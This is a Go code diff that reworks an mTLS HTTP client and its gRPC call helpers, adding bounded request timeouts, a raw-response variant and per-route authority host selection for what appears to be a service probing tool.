 	dialer := &net.Dialer{Timeout: requestTimeout, KeepAlive: 30 * time.Second}
@@ -865,7 +1531,14 @@ func newMTLSClient(routeMode string) (*http.Client, string, error) {
 		TLSClientConfig:   tlsConfig,
 		ForceAttemptHTTP2: true,
 	}
-	return &http.Client{Transport: transport, Timeout: requestTimeout}, endpoint, nil
+	return &http.Client{Transport: transport, Timeout: bytemanHTTPTimeout}, endpoint, nil
+}
+
+func bytemanAuthorityHost(serviceHost, tlsServerName string, useInjectedRPC bool) string {
+	if useInjectedRPC {
+		return tlsServerName
+	}
+	return serviceHost
 }
 
 func bytemanRoute(routeMode string) (string, int, string, bool, error) {
@@ -888,25 +1561,50 @@ func bytemanRoute(routeMode string) (string, int, string, bool, error) {
 }
 
 func callGRPC(client *http.Client, endpoint, method string, payload []byte) grpcResult {
+	result, _ := callGRPCRaw(client, endpoint, method, payload)
+	return result
+}
+
+func callGRPCRaw(client *http.Client, endpoint, method string, payload []byte) (grpcResult, []byte) {
+	return callGRPCRawLimits(client, endpoint, method, payload, bytemanGRPCTimeout, bytemanHTTPTimeout)
+}
+
+func callGRPCRawTimeout(client *http.Client, endpoint, method string, payload []byte, timeout time.Duration) (grpcResult, []byte) {
+	return callGRPCRawLimits(client, endpoint, method, payload, timeout, timeout)
+}
+
+func callGRPCRawLimits(client *http.Client, endpoint, method string, payload []byte, grpcTimeout, httpTimeout time.Duration) (grpcResult, []byte) {
 	result := grpcResult{Method: method}
+	if grpcTimeout <= 0 || grpcTimeout > bytemanGRPCTimeout || httpTimeout < grpcTimeout || httpTimeout > bytemanHTTPTimeout {
+		result.Error = "gRPC timeout was outside the bounded range"
+		return result, nil
+	}
 	frame := make([]byte, 5, 5+len(payload))
 	binary.BigEndian.PutUint32(frame[1:], uint32(len(payload)))
 	frame = append(frame, payload...)
-	ctx, cancel := context.WithTimeout(context.Background(), requestTimeout)
+	ctx, cancel := context.WithTimeout(context.Background(), httpTimeout)
 	defer cancel()
 	request, err := http.NewRequestWithContext(ctx, http.MethodPost, endpoint+method, bytes.NewReader(frame))
 	if err != nil {
 		result.Error = cleanError(err)
-		return result
+		return result, nil
 	}
 	request.Header.Set("Content-Type", "application/grpc")
 	request.Header.Set("TE", "trailers")
 	request.Header.Set("User-Agent", probeUserAgent)
-	request.Header.Set("Grpc-Timeout", "18S")
+	if grpcTimeout == bytemanGRPCTimeout {
+		request.Header.Set("Grpc-Timeout", "60S")
+	} else {
+		timeoutMS := grpcTimeout.Milliseconds()
+		if timeoutMS < 1 {
+			timeoutMS = 1
+		}
+		request.Header.Set("Grpc-Timeout", strconv.FormatInt(timeoutMS, 10)+"m")
+	}
 	response, err := client.Do(request)
 	if err != nil {
 		result.Error = cleanError(err)
-		return result
+		return result, nil
 	}
 	defer response.Body.Close()
 	result.HTTPStatus = response.StatusCode
@@ -914,11 +1612,11 @@ func callGRPC(client *http.Client, endpoint, method string, payload []byte) grpc
 	body, err := io.ReadAll(io.LimitReader(response.Body, maximumBody+1))
 	if err != nil {
 		result.Error = cleanError(err)
-		return result
+		return result, nil
 	}
 	if len(body) > maximumBody {
 		result.Error = "gRPC response too large"
-		return result
+		return result, nil
 	}
 	result.BodyBytes = len(body)
 	digest := sha256.Sum256(body)
@@ -940,7 +1638,7 @@ func callGRPC(client *http.Client, endpoint, method string, payload []byte) grpc
 		result.GRPCMessage = result.GRPCMessage[:1024] + "[truncated]"
 	}
 	result.Authenticated = result.GRPCStatus == "0"
-	return result
+	return result, body
 }
 
 func appendUvarint(destination []byte, value uint64) []byte {
